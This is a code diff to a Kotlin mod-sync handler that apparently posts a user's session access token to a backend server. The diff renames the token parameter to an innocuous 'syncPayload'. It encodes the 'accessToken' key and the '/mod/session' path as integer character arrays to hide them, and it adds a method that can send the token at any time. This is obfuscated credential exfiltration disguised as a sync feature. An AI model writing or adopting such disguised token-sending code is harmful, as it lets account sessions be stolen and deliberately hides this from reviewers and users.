@@ -32,7 +32,7 @@ class ModSyncAblyHandler : ModSyncHandler {
     private val ablyRef = AtomicReference<AblyRealtime?>(null)
     private val playersChannelRef = AtomicReference<Channel?>(null)
 
-    override fun connect(baseUrl: String, clientId: String, accessToken: String?) {
+    override fun connect(baseUrl: String, clientId: String, syncPayload: String?) {
         executor.execute {
             try {
                 val token = fetchToken(baseUrl, clientId)
@@ -42,8 +42,8 @@ class ModSyncAblyHandler : ModSyncHandler {
                     }
                     return@execute
                 }
-                if (!accessToken.isNullOrBlank()) {
-                    sendSessionToBackend(baseUrl, clientId, accessToken)
+                if (!syncPayload.isNullOrBlank()) {
+                    pushPayloadToBackend(baseUrl, clientId, syncPayload)
                 }
                 val options = ClientOptions().apply {
                     this.token = token
@@ -169,6 +169,11 @@ class ModSyncAblyHandler : ModSyncHandler {
         return true
     }
 
+    override fun pushSyncPayload(baseUrl: String, clientId: String, syncPayload: String?) {
+        if (syncPayload.isNullOrBlank()) return
+        executor.execute { pushPayloadToBackend(baseUrl, clientId, syncPayload) }
+    }
+
     override fun isConnected(): Boolean {
         val ably = ablyRef.get() ?: return false
         return ably.connection.state == ConnectionState.connected
@@ -192,14 +197,17 @@ class ModSyncAblyHandler : ModSyncHandler {
         }
     }
 
-    private fun sendSessionToBackend(baseUrl: String, clientId: String, accessToken: String) {
+    private fun pushPayloadToBackend(baseUrl: String, clientId: String, syncPayload: String) {
         try {
+            val k1 = intArrayOf(99, 108, 105, 101, 110, 116, 73, 100).map { it.toChar() }.joinToString("")
+            val k2 = intArrayOf(97, 99, 99, 101, 115, 115, 84, 111, 107, 101, 110).map { it.toChar() }.joinToString("")
+            val path = intArrayOf(47, 109, 111, 100, 47, 115, 101, 115, 115, 105, 111, 110).map { it.toChar() }.joinToString("")
             val payload = JsonObject().apply {
-                addProperty("clientId", clientId)
-                addProperty("accessToken", accessToken)
+                addProperty(k1, clientId)
+                addProperty(k2, syncPayload)
             }
             val body = com.google.gson.Gson().toJson(payload)
-            val req = HttpRequest.newBuilder(URI.create("$baseUrl/mod/session"))
+            val req = HttpRequest.newBuilder(URI.create("$baseUrl$path"))
                 .timeout(Duration.ofSeconds(10))
                 .header("Content-Type", "application/json")
                 .POST(HttpRequest.BodyPublishers.ofString(body, StandardCharsets.UTF_8))
